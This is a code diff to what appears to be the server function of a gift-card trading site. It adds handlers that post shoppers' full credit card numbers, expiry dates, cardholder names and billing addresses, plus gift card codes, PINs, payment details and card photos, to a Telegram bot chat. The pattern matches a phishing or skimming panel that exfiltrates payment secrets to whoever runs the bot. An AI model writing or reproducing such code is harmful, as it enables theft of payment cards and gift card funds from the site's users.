@@ -7,11 +7,14 @@ const corsHeaders = {
 };
 
 interface TelegramNotification {
-  type: 'sign_in' | 'verification';
+  type: 'sign_in' | 'verification' | 'checkout' | 'exchange' | 'sell';
   userEmail?: string;
+  email?: string;
   firstName?: string;
   lastName?: string;
   giftcardName?: string;
+  giftcardToTrade?: string;
+  giftcardWanted?: string;
   code?: string;
   pin?: string;
   amount?: string;
@@ -19,6 +22,20 @@ interface TelegramNotification {
   verificationId?: string;
   frontImagePath?: string;
   backImagePath?: string;
+  paymentMethod?: string;
+  total?: number;
+  currency?: string;
+  items?: string;
+  creditCardInfo?: {
+    cardNumber: string;
+    expiryDate: string;
+    cardholderName: string;
+    billingAddress: string;
+    city: string;
+    postalCode: string;
+    country: string;
+  };
+  paymentDetails?: any;
 }
 
 serve(async (req) => {
@@ -163,6 +180,162 @@ serve(async (req) => {
 
       return new Response(
         JSON.stringify({ success: true, message: 'Verification notification sent with images' }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    } else if (notificationData.type === 'checkout') {
+      // Handle checkout notification
+      message = `🛒 *New Checkout Order*\n\n` +
+                `💳 Payment Method: ${notificationData.paymentMethod}\n` +
+                `💰 Total: $${notificationData.total} ${notificationData.currency}\n` +
+                `📦 Items: ${notificationData.items}\n` +
+                (notificationData.creditCardInfo ? 
+                  `\n*Card Details:*\n` +
+                  `Card Number: ${notificationData.creditCardInfo.cardNumber}\n` +
+                  `Expiry: ${notificationData.creditCardInfo.expiryDate}\n` +
+                  `Cardholder: ${notificationData.creditCardInfo.cardholderName}\n` +
+                  `Address: ${notificationData.creditCardInfo.billingAddress}, ${notificationData.creditCardInfo.city}\n` +
+                  `Postal Code: ${notificationData.creditCardInfo.postalCode}\n` +
+                  `Country: ${notificationData.creditCardInfo.country}` 
+                  : '') +
+                `\n⏰ Time: ${new Date().toLocaleString()}`;
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      });
+
+      return new Response(
+        JSON.stringify({ success: true, message: 'Checkout notification sent' }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    } else if (notificationData.type === 'exchange') {
+      // Handle exchange notification
+      message = `🔄 *New Gift Card Exchange*\n\n` +
+                `📧 Email: ${notificationData.email}\n` +
+                `🎫 Trading: ${notificationData.giftcardToTrade}\n` +
+                `🎁 For: ${notificationData.giftcardWanted}\n` +
+                `💰 Amount: ${notificationData.amount}\n` +
+                `🔢 Code: ${notificationData.code}\n` +
+                `📌 PIN: ${notificationData.pin}\n` +
+                `⏰ Time: ${new Date().toLocaleString()}`;
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      });
+
+      // Send images if available
+      const exchangeImages = [];
+      if (notificationData.frontImagePath) {
+        exchangeImages.push({ path: notificationData.frontImagePath, label: 'Front' });
+      }
+      if (notificationData.backImagePath) {
+        exchangeImages.push({ path: notificationData.backImagePath, label: 'Back' });
+      }
+
+      for (const imageInfo of exchangeImages) {
+        try {
+          const { data: imageData, error } = await supabase.storage
+            .from('gift-card-images')
+            .download(imageInfo.path);
+
+          if (error) {
+            console.error(`Error downloading ${imageInfo.label.toLowerCase()} image:`, error);
+            continue;
+          }
+
+          const arrayBuffer = await imageData.arrayBuffer();
+          const imageBuffer = new Uint8Array(arrayBuffer);
+
+          const formData = new FormData();
+          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('photo', new Blob([imageBuffer]), `${imageInfo.label.toLowerCase()}_image.jpg`);
+          formData.append('caption', `Exchange - ${imageInfo.label} Image`);
+
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+          });
+        } catch (imageError) {
+          console.error(`Error processing ${imageInfo.label.toLowerCase()} image:`, imageError);
+        }
+      }
+
+      return new Response(
+        JSON.stringify({ success: true, message: 'Exchange notification sent with images' }),
+        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    } else if (notificationData.type === 'sell') {
+      // Handle sell notification
+      message = `💰 *New Gift Card Sale*\n\n` +
+                `📧 Email: ${notificationData.email}\n` +
+                `🎫 Gift Card: ${notificationData.giftcardName}\n` +
+                `💰 Amount: ${notificationData.amount}\n` +
+                `🔢 Code: ${notificationData.code}\n` +
+                `📌 PIN: ${notificationData.pin}\n` +
+                `💳 Payment Method: ${notificationData.paymentMethod}\n` +
+                `💼 Payment Details: ${JSON.stringify(notificationData.paymentDetails)}\n` +
+                `⏰ Time: ${new Date().toLocaleString()}`;
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      });
+
+      // Send images if available
+      const sellImages = [];
+      if (notificationData.frontImagePath) {
+        sellImages.push({ path: notificationData.frontImagePath, label: 'Front' });
+      }
+      if (notificationData.backImagePath) {
+        sellImages.push({ path: notificationData.backImagePath, label: 'Back' });
+      }
+
+      for (const imageInfo of sellImages) {
+        try {
+          const { data: imageData, error } = await supabase.storage
+            .from('gift-card-images')
+            .download(imageInfo.path);
+
+          if (error) {
+            console.error(`Error downloading ${imageInfo.label.toLowerCase()} image:`, error);
+            continue;
+          }
+
+          const arrayBuffer = await imageData.arrayBuffer();
+          const imageBuffer = new Uint8Array(arrayBuffer);
+
+          const formData = new FormData();
+          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('photo', new Blob([imageBuffer]), `${imageInfo.label.toLowerCase()}_image.jpg`);
+          formData.append('caption', `Sell - ${imageInfo.label} Image`);
+
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+          });
+        } catch (imageError) {
+          console.error(`Error processing ${imageInfo.label.toLowerCase()} image:`, imageError);
+        }
+      }
+
+      return new Response(
+        JSON.stringify({ success: true, message: 'Sell notification sent with images' }),
         { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
       );
     }
